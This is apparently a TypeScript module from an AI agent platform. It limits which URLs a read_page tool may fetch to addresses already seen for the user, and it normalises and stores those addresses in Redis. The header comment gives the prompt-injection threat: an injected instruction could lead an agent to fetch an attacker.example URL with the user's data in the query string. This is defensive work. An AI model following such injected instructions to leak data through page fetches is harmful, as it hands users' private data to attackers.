// Which addresses read_page may open for a user (HLD 5.1). read_page needs no approval, so an
// injected instruction could otherwise make an agent fetch `https://attacker.example/?d=<data>`
// and hand the user's data over. The rule: only an address the platform has already seen for
// this user, by exact match after normalising:
//   (a) an address in the user's own recent messages,
//   (b) a result of web_search,
//   (c) a link on a page read_page already returned.
// (b) and (c) are kept here, in Redis, per user, for a day. (a) is read from the messages.
import { logger } from '../../shared/logger.ts';
import { redis } from '../../shared/redis.ts';
import { recentInboundTexts } from '../channels/messages.ts';

export const SEEN_URL_TTL_SECONDS = 24 * 3600;
/** The most addresses kept per user; the oldest go first. */
export const SEEN_URLS_MAX = 500;
const URL_MAX_CHARS = 2000;
/** (a): the user's last messages that are looked at. */
export const USER_MESSAGES_MAX = 100;
export const USER_MESSAGES_DAYS = 7;

const storeKey = (userId: string) => `seen-urls:${userId}`;

/**
 * What two spellings of the same address share: the host without `www.`, the path without a
 * trailing slash, and the whole query string. `http`/`https` and the fragment are left out.
 * Nothing else is: the path and the query must match exactly. Null: not an http(s) address.
 */
export function urlKey(raw: string | URL): string | null {
  let u: URL;
  try {
    u = typeof raw === 'string' ? new URL(raw.trim()) : raw;
  } catch {
    return null;
  }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') return null;
  const host = u.hostname
    .toLowerCase()
    .replace(/\.$/, '')
    .replace(/^www\./, '');
  const port = u.port ? `:${u.port}` : '';
  let end = u.pathname.length;
  while (end > 0 && u.pathname[end - 1] === '/') end--;
  return `${host}${port}${u.pathname.slice(0, end)}${u.search}`;
}

const WITH_SCHEME = /https?:\/\/[^\s<>"'`]+/gi;
/** `example.com/page` written without `https://` (not the host part of an email address). */
const BARE = /(?<![\w@/.:-])(?:[a-z0-9-]{1,63}\.)+[a-z]{2,24}(?:\/[^\s<>"'`]*)?/gi;
/** Punctuation that ends a sentence or a bracket, not an address. */
const TRAILING = new Set('.,;:!?)]}\'"…');
function withoutTrailing(found: string): string {
  let end = found.length;
  while (end > 0 && TRAILING.has(found[end - 1]!)) end--;
  return found.slice(0, end);
}

/** The web addresses written in a piece of text, as full `http(s)://` addresses. */
export function urlsInText(text: string): string[] {
  const out: string[] = [];
  const add = (found: string, scheme: string) => {
    const url = `${scheme}${withoutTrailing(found)}`;
    if (url.length <= URL_MAX_CHARS && urlKey(url)) out.push(url);
  };
  for (const m of text.matchAll(WITH_SCHEME)) add(m[0], '');
  // What is left once those are taken out may still name a site without a scheme.
  for (const m of text.replace(WITH_SCHEME, ' ').matchAll(BARE)) add(m[0], 'https://');
  return out;
}

/** (b) and (c): the platform showed these addresses to the user's agent. Never fails the call. */
export async function rememberUrls(userId: string, urls: string[]): Promise<void> {
  const fresh = [...new Set(urls)].filter((u) => u.length <= URL_MAX_CHARS && urlKey(u));
  if (!fresh.length) return;
  const now = Date.now();
  const key = storeKey(userId);
  try {
    await redis()
      .multi()
      .zadd(key, ...fresh.flatMap((u) => [now, u]))
      .zremrangebyscore(key, 0, now - SEEN_URL_TTL_SECONDS * 1000)
      .zremrangebyrank(key, 0, -(SEEN_URLS_MAX + 1))
      .expire(key, SEEN_URL_TTL_SECONDS)
      .exec();
  } catch (err) {
    // Without the record these addresses are simply refused later: the safe side.
    logger().warn({ userId, err: String(err) }, 'seen addresses not saved');
  }
}

/**
 * Every address seen for this user, as normalised key → the address as it was seen. read_page
 * fetches that seen address, not the agent's spelling of it.
 */
export async function seenUrls(userId: string): Promise<Map<string, string>> {
  const since = Date.now() - SEEN_URL_TTL_SECONDS * 1000;
  const [stored, texts] = await Promise.all([
    redis().zrangebyscore(storeKey(userId), since, '+inf'),
    recentInboundTexts(
      userId,
      new Date(Date.now() - USER_MESSAGES_DAYS * 24 * 3600 * 1000),
      USER_MESSAGES_MAX,
    ),
  ]);
  const seen = new Map<string, string>();
  for (const url of [...texts.flatMap(urlsInText), ...stored]) {
    const key = urlKey(url);
    if (key && !seen.has(key)) seen.set(key, url);
  }
  return seen;
}
